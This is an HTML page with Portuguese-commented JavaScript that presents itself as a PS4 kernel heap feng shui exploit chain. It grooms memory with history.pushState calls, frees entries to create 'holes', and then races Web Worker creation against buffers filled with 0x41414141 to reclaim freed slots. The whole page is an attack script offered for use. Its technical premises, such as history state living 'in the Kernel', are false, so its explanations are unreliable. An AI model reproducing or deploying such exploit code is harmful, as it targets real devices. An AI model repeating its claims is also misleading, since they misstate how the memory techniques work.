<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Heap Feng Shui</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: monospace; }
        .log { border-bottom: 1px solid #333; padding: 2px; }
    </style>
</head>
<body>
    <h3>KERNEL HEAP FENG SHUI</h3>
    <button onclick="runExploit()">INICIAR ATTACK CHAIN (GROOMING)</button>
    <div id="console"></div>

    <script>
        var logElem = document.getElementById('console');
        function log(msg) {
            var d = document.createElement('div');
            d.className = 'log';
            d.innerText = msg;
            logElem.appendChild(d);
        }

        // Arrays para segurar a memória e não deixar o Garbage Collector limpar
        var grooming = [];
        var holes = [];

        // 1. PREPARAÇÃO (GROOMING)
        // Aloca muita memória de forma organizada
        function heapGrooming() {
            log("[1] Iniciando Heap Feng Shui...");
            
            // Tamanho do objeto alvo (vamos tentar 2 tamanhos comuns de structs)
            // Tente mudar este valor se não funcionar: 1024, 2048, 16384 (16KB)
            const ALLOC_SIZE = 1024 * 32; 
            
            // Criamos uma string que ocupa exatamente esse tamanho na memória
            // (String em JS usa 2 bytes por caractere + cabeçalho)
            let strPayload = "A".repeat(ALLOC_SIZE / 2);

            // Alocamos 1000 itens
            for (let i = 0; i < 1000; i++) {
                // history.pushState guarda o estado no Kernel
                let state = { id: i, data: strPayload };
                grooming.push(state);
                history.pushState(state, "", "k" + i);
            }
            
            log("[+] Memória organizada (1000 blocos alocados).");
            createHoles();
        }

        // 2. CRIAR BURACOS (HOLES)
        // Removemos itens estratégicos para forçar o Kernel a usar esses espaços
        function createHoles() {
            log("[2] Criando buracos controlados...");
            
            // Vamos liberar um a cada 50 itens
            // Isso cria "ilhas" de memória livre cercadas por memória nossa
            for (let i = 500; i < 1000; i += 50) {
                // Ao fazer replaceState com null, liberamos a memória antiga
                history.replaceState(null, "", "k" + i);
                holes.push(i); // Guardamos onde está o buraco
            }
            
            log(`[+] ${holes.length} buracos criados. Disparando Race Condition...`);
            setTimeout(triggerRace, 100);
        }

        // 3. DISPARAR A CORRIDA
        // Agora que temos buracos, criamos a thread. O Kernel deve colocar a thread
        // em um dos nossos buracos.
        function triggerRace() {
            const blob = new Blob([`
                self.onmessage = function() {
                    // A thread vive pouco
                    self.close();
                }
            `], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);

            // Tentamos atingir apenas os buracos que criamos
            let attempts = 0;
            
            let iv = setInterval(() => {
                attempts++;
                
                // Cria Worker
                let w = new Worker(url);
                w.postMessage("start");
                
                // Tenta SOBRESCREVER o buraco imediatamente
                // Se a thread pegou o buraco e morreu, nós tentamos pegar de volta
                // com dados maliciosos (0x41414141)
                let payload = new Uint32Array(1024 * 8); // 32KB buffer
                payload.fill(0x41414141);
                
                try {
                    // Envia buffer via postMessage para tentar reocupar o slot
                    w.postMessage(payload, [payload.buffer]);
                } catch(e) {}

                if (attempts > 200) {
                    clearInterval(iv);
                    log("[-] Tentativas finalizadas. Se não crashou, ajuste o ALLOC_SIZE.");
                }
            }, 5); // Intervalo curto
        }

        function runExploit() {
            try {
                heapGrooming();
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
    </script>
</body>
</html>
